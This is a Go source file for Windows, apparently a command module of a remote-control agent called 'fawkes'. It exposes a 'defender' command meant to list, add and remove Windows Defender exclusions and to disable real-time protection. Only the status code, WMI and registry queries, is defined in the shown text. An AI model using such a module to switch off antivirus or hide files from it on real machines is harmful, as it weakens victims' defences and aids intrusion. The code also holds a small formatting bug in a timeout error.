//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"time"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

type DefenderCommand struct{}

func (c *DefenderCommand) Name() string {
	return "defender"
}

func (c *DefenderCommand) Description() string {
	return "Manage Windows Defender — status, exclusions, threats, enable/disable real-time protection"
}

type defenderArgs struct {
	Action string `json:"action"`
	Type   string `json:"type"`
	Value  string `json:"value"`
}

func (c *DefenderCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[defenderArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "status":
		return defenderStatus()
	case "exclusions":
		return defenderExclusions()
	case "add-exclusion":
		return defenderAddExclusion(args)
	case "remove-exclusion":
		return defenderRemoveExclusion(args)
	case "threats":
		return defenderThreats()
	case "enable":
		return defenderSetRealtime(true)
	case "disable":
		return defenderSetRealtime(false)
	default:
		return errorf("Unknown action: %s\nAvailable: status, exclusions, add-exclusion, remove-exclusion, threats, enable, disable", args.Action)
	}
}

// defenderWMIQuery connects to root\Microsoft\Windows\Defender and runs a WQL query.
func defenderWMIQuery(wql string) (string, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return "", fmt.Errorf("CoInitializeEx failed: %w", err)
		}
	}
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return "", fmt.Errorf("failed to create SWbemLocator: %w", err)
	}
	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		return "", fmt.Errorf("failed to query IDispatch: %w", err)
	}
	defer locator.Release()

	serviceResult, err := oleutil.CallMethod(locator, "ConnectServer", "", `root\Microsoft\Windows\Defender`)
	if err != nil {
		return "", fmt.Errorf("ConnectServer failed: %v (is Windows Defender installed?)", err)
	}
	services := serviceResult.ToIDispatch()
	defer services.Release()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery", wql)
	if err != nil {
		return "", fmt.Errorf("ExecQuery failed: %w", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	var sb strings.Builder
	itemCount := 0

	err = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		// Note: do NOT Release item — ForEach manages the VARIANT lifecycle

		if itemCount > 0 {
			sb.WriteString("\n---\n")
		}
		itemCount++

		propsResult, err := oleutil.GetProperty(item, "Properties_")
		if err != nil {
			return fmt.Errorf("failed to get Properties_: %w", err)
		}
		defer propsResult.Clear()
		propsDisp := propsResult.ToIDispatch()

		err = oleutil.ForEach(propsDisp, func(pv *ole.VARIANT) error {
			prop := pv.ToIDispatch()
			// Note: do NOT Release prop — ForEach manages the VARIANT lifecycle

			nameResult, err := oleutil.GetProperty(prop, "Name")
			if err != nil {
				return nil
			}
			defer nameResult.Clear()

			valResult, err := oleutil.GetProperty(prop, "Value")
			if err != nil {
				sb.WriteString(fmt.Sprintf("%s=\n", nameResult.ToString()))
				return nil
			}
			defer valResult.Clear()

			name := nameResult.ToString()
			val := defenderVariantToString(valResult)
			if val != "" {
				sb.WriteString(fmt.Sprintf("%s=%s\n", name, val))
			}
			return nil
		})
		if err != nil {
			return fmt.Errorf("iterating defender WMI properties: %w", err)
		}
		return nil
	})

	if err != nil {
		return sb.String(), err
	}
	if itemCount == 0 {
		return "(no results)", nil
	}
	return sb.String(), nil
}

// defenderVariantToString converts a VARIANT to a readable string.
func defenderVariantToString(v *ole.VARIANT) string {
	if v == nil {
		return ""
	}
	switch v.VT {
	case ole.VT_NULL, ole.VT_EMPTY:
		return ""
	case ole.VT_BSTR:
		return v.ToString()
	default:
		val := v.Value()
		if val == nil {
			return ""
		}
		return fmt.Sprintf("%v", val)
	}
}

// defenderWMIQueryWithTimeout runs a WMI query with a timeout to prevent agent hangs.
func defenderWMIQueryWithTimeout(wql string, timeout time.Duration) (string, error) {
	type wmiResult struct {
		output string
		err    error
	}
	ch := make(chan wmiResult, 1)
	go func() {
		out, err := defenderWMIQuery(wql)
		ch <- wmiResult{out, err}
	}()
	select {
	case r := <-ch:
		return r.output, r.err
	case <-time.After(timeout):
		return "", fmt.Errorf("WMI query timed out after %w", timeout)
	}
}

// defenderStatus gets Defender status, trying registry first (fast), then WMI.
func defenderStatus() structs.CommandResult {
	// Registry is faster and more reliable — try it first
	regResult := defenderStatusRegistry()

	// Also try WMI for additional details (with timeout to prevent hangs)
	wmiResult, err := defenderWMIQueryWithTimeout(
		"SELECT AMRunningMode, AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, "+
			"BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, OnAccessProtectionEnabled, "+
			"RealTimeProtectionEnabled, QuickScanAge, FullScanAge, ComputerState FROM MSFT_MpComputerStatus",
		15*time.Second,
	)
	if err == nil && wmiResult != "" && wmiResult != "(no results)" {
		return successf("Windows Defender Status:\n\n%s\n\n--- Registry Details ---\n%s", wmiResult, regResult.Output)
	}

	// WMI failed or timed out — return registry results
	return regResult
}

// defenderStatusRegistry reads Defender status from the registry as a fallback.
func defenderStatusRegistry() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("Windows Defender Status (from registry):\n\n")

	// Check if Defender is disabled via policy
	policyKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Policies\Microsoft\Windows Defender`, registry.READ)
	if err == nil {
		val, _, err := policyKey.GetIntegerValue("DisableAntiSpyware")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  Policy DisableAntiSpyware: %d\n", val))
		}
		val, _, err = policyKey.GetIntegerValue("DisableAntiVirus")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  Policy DisableAntiVirus: %d\n", val))
		}
		policyKey.Close()
	}

	// Real-time protection settings
	rtpKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows Defender\Real-Time Protection`, registry.READ)
	if err == nil {
		val, _, err := rtpKey.GetIntegerValue("DisableRealtimeMonitoring")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  DisableRealtimeMonitoring: %d\n", val))
		}
		val, _, err = rtpKey.GetIntegerValue("DisableBehaviorMonitoring")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  DisableBehaviorMonitoring: %d\n", val))
		}
		val, _, err = rtpKey.GetIntegerValue("DisableOnAccessProtection")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  DisableOnAccessProtection: %d\n", val))
		}
		val, _, err = rtpKey.GetIntegerValue("DisableScanOnRealtimeEnable")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  DisableScanOnRealtimeEnable: %d\n", val))
		}
		rtpKey.Close()
	} else {
		sb.WriteString("  Real-Time Protection: (registry key not accessible)\n")
	}

	// Defender service status
	defKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows Defender`, registry.READ)
	if err == nil {
		val, _, err := defKey.GetIntegerValue("DisableAntiSpyware")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  DisableAntiSpyware: %d\n", val))
		}
		defKey.Close()
	}

	return successResult(sb.String())
}

